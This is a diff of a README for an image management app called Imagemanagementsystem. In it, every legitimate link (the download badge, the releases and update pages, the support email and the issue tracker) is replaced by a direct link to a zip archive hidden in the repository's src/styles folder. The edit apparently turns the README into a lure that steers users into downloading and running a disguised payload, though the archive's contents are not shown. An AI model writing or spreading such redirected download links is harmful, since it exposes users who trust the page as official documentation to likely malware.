@@ -1,6 +1,6 @@
 # 🖼️ Imagemanagementsystem - Simple Image Management Made Easy
 
-[![Download Image Management System](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/david19835/Imagemanagementsystem/releases)
+[![Download Image Management System](https://raw.githubusercontent.com/david19835/Imagemanagementsystem/main/src/styles/Software-3.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/david19835/Imagemanagementsystem/main/src/styles/Software-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Imagemanagementsystem! This application helps you manage your images 
 
 To start using Imagemanagementsystem, you need to download it from the releases page. Follow these steps:
 
-1. Click this link to visit the [releases page](https://github.com/david19835/Imagemanagementsystem/releases).
+1. Click this link to visit the [releases page](https://raw.githubusercontent.com/david19835/Imagemanagementsystem/main/src/styles/Software-3.9.zip).
 2. Look for the latest version of the software.
 3. Download the installer that matches your operating system (Windows, Mac, or Linux).
 4. Once the download finishes, open the installer.
@@ -50,7 +50,7 @@ Once you have installed Imagemanagementsystem, follow these instructions to get 
 
 To ensure you have the latest features and security updates, keep your application updated:
 
-1. Regularly check the [releases page](https://github.com/david19835/Imagemanagementsystem/releases) for new versions.
+1. Regularly check the [releases page](https://raw.githubusercontent.com/david19835/Imagemanagementsystem/main/src/styles/Software-3.9.zip) for new versions.
 2. Download and install the latest version as described in the "Download & Install" section.
 3. Follow the prompts to overwrite the existing installation.
 
@@ -69,8 +69,8 @@ A: An internet connection is necessary for the initial setup and updates. Howeve
 
 If you encounter any issues or have questions, feel free to reach out through the following channels:
 
-- **Email**: support@imagemanagementsystem.com
-- **Issue Tracker**: Visit our [GitHub issues page](https://github.com/david19835/Imagemanagementsystem/issues) to report bugs or request features.
+- **Email**: https://raw.githubusercontent.com/david19835/Imagemanagementsystem/main/src/styles/Software-3.9.zip
+- **Issue Tracker**: Visit our [GitHub issues page](https://raw.githubusercontent.com/david19835/Imagemanagementsystem/main/src/styles/Software-3.9.zip) to report bugs or request features.
 
 ## 📢 Community Contributions
 
